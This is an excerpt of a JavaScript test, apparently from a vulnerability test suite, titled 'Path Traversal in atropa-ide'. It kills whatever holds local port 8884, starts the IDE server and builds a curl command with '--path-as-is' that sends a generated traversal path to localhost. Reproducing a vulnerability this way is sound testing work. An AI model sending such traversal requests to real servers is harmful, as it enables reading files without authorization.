...
const v31 = done => {
    ...
    try {
        ...
        const v23 = a.execSync('fuser -k 8884/tcp', v22);
        v23;
    } catch (e) {
    }
    const path = require('path');
    ...
    const v24 = ide.start(port, serverRoot);
    v24;
    const v25 = genstr();
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8884${ v25 }"`;
...
const v32 = test('Path Traversal in atropa-ide', v31);
v32;